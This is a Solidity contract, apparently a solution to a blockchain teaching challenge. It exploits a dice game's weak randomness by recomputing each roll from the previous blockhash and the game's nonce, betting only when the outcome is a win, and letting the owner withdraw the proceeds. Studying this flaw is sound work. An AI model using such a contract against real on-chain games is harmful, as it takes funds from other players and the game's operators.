//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./Console.sol";
import "./DiceGame.sol";
import "./Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Roll(address indexed player, uint256 roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        payable(_addr).transfer(_amount);
    }


    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "not enough money");
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        console.log(address(this).balance);
        console.log("prevHash");
        console.logBytes32(prevHash);
        console.log("address");
        console.log(address(diceGame));
        console.log("nonce");
        console.log(nonce);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        console.log("hash");
        console.logBytes32(hash);
        uint256 roll = uint256(hash) % 16;
        console.log("THE ROLL IS ",roll);
        emit Roll(msg.sender, roll);
        if (roll < 3) {
            diceGame.rollTheDice{value: .002 ether}();
            console.log("called rollTheDice");
            console.log(address(this).balance);
        }
        else {
            console.log("did not call rollTheDice");
            console.log(address(this).balance);
        }
    }


    receive() external payable {  }
    
}
